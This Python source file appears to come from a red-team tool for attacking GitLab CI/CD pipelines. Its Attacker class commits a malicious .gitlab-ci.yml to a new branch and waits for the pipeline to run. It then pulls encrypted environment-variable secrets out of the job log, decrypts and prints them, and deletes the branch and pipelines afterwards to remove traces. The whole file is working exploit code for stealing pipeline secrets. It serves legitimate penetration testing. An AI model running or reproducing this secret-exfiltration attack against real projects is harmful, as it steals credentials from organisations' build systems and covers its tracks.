# Copyright 2023-2025 Praetorian Security, Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from typing import Generator, Dict, Optional, Tuple, Set, List
from .cicd_attack import CICDAttack
from ..services.project import Project
from ..gitlab.api import *
from ..gitlab.secrets import *
import json
import re
from time import sleep
from base64 import b64encode, b64decode
from hashlib import pbkdf2_hmac

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher
from cryptography.hazmat.primitives.ciphers import algorithms
from cryptography.hazmat.primitives.ciphers import modes


class Attacker:
    """Class holding all high level logic for attacking GitLab environment and runners.
    """

    def __init__(self,
                 token: Optional[str] = None,
                 cookies: Optional[Dict] = None,
                 proxy: Optional[str] = None,
                 verify_ssl: bool = True,
                 gitlab_url: str = 'https://gitlab.com',
                 config_path: Optional[str] = None,
                 check_branch_protection: bool = False,
                 throttle: Optional[int] = None
                 ):
        """Initialize with dependency on Api's centralized caching."""
        self.api = Api(pat=token, cookies=cookies, proxy=proxy,
                       verify_ssl=verify_ssl, gitlab_url=gitlab_url,
                       config_path=config_path, throttle=throttle)
        self.setup_complete = False
        self.scopes = []
        self._user_info = None
        self.check_branch_protection = check_branch_protection

    @staticmethod
    def __create_key_pair():
        """Creates a private and public key to safely exfiltrate secrets.
        """
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=4096,
            backend=default_backend()
        )

        public_key = private_key.public_key()
        pubkey_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        enc_pubkey = b64encode(pubkey_pem).decode()

        return (private_key, enc_pubkey)

    @staticmethod
    def __decrypt_secrets(private_key,
                          blobs):
        """Utility to decrypt secrets given the ciphertext blobs and the private key.
        """
        (enc_symkey, enc_secrets) = [b64decode(blob) for blob in blobs]

        salt = enc_secrets[8:16]
        ciphertext = enc_secrets[16:]

        symkey = private_key.decrypt(enc_symkey,
                                     padding.PKCS1v15())
        derived_key = pbkdf2_hmac('sha256', symkey, salt, 10000, 48)
        key = derived_key[:32]
        iv = derived_key[32:48]

        cipher = Cipher(algorithms.AES256(key), modes.CBC(iv))
        decryptor = cipher.decryptor()

        cleartext = decryptor.update(ciphertext) + decryptor.finalize()
        cleartext = cleartext[:-cleartext[-1]]

        return cleartext

    def attack_project(self,
                       project_path,
                       branch_name):
        (private_key, encoded_pubkey) = Attacker.__create_key_pair()

        project = Project(project_path, self.api)

        # Check if project is archived
        if project.project.get('archived', False):
            print(
                f'\n[WARNING] Project {project_path} is archived and may not be vulnerable to PPE attacks.')
            print(
                f'Archived Date: {
                    project.project.get(
                        "archived_at",
                        "Unknown")}')
            print('Archived projects typically have disabled CI/CD pipelines.')

            response = input('Do you want to continue anyway? (y/N): ')
            if response.lower() not in ['y', 'yes']:
                print('Attack cancelled.')
                return

        print(f'\nBeginning Secrets Exfiltration on {project_path}')
        sufficient_privs, branch_created = project.create_branch(branch_name)

        if not sufficient_privs:
            print(
                f'\nBranch creation unsucessful. Make sure user has at least Developer privileges to {project_path} and that {branch_name} is an unprotected branch.')
            return

        pipeline_yml_exists = self.api.check_if_file_exists(
            project.id, ".gitlab-ci.yml", branch_name)

        if pipeline_yml_exists:
            action = 'update'
            print(
                f'Updating .gitlab-ci.yml on branch {branch_name} of {project_path} ')
        else:
            action = 'create'
            print(
                f'Creating .gitlab-ci.yml on branch {branch_name} of {project_path} ')

        actions = [
            {
                'action': action,
                'file_path': '.gitlab-ci.yml',
                'content': CICDAttack.create_exfil_yaml(encoded_pubkey)
            }
        ]
        if not project.create_commit(branch_name, actions):
            return

        jobs = []
        pipelines = []
        status = ""
        try:
            while True:
                sleep(5)
                print(f'Awaiting pipeline execution results....')

                pipeline = project.get_latest_pipeline(branch_name)
                if pipeline['status'] in [
                        'success', 'failed', 'canceled', 'skipped']:
                    print(f"Pipeline Status = {pipeline['status']}")
                    status = pipeline['status']
                    break

            jobs = project.get_pipeline_jobs(pipeline['id'])

            pipelines = project.get_pipelines_by({'ref': branch_name})
        except Exception as e:
            print(f"Pipeline error: {e}")

        if branch_created:
            project.delete_branch(branch_name)

        job_log = ""
        job = None
        try:
            for current_job in jobs:
                if current_job['name'] == 'build_a':
                    job = current_job
                    break

            if job is None:
                raise Exception("No 'build_a' job found in pipeline")

            job_log = project.get_job_log(job['id'])

            matcher = re.compile(
                r'\$([0-9A-Za-z/+=]+)\$([0-9A-Za-z/+=]+)\$'
            )

            blobs = matcher.search(job_log).groups()

            secrets = Attacker.__decrypt_secrets(private_key, blobs)
            print("Printing decrypted output of secrets exfiltration. This includes all environment variables available to this pipeline executor.")
            print("-----------------")
            print(secrets.decode())
            print("-----------------")
        except Exception as e:
            print(f"Error retrieving encrypted secrets: {e}")
            print("Job Log: " + job_log)

        for pipeline in pipelines:
            project.delete_pipeline(pipeline['id'])
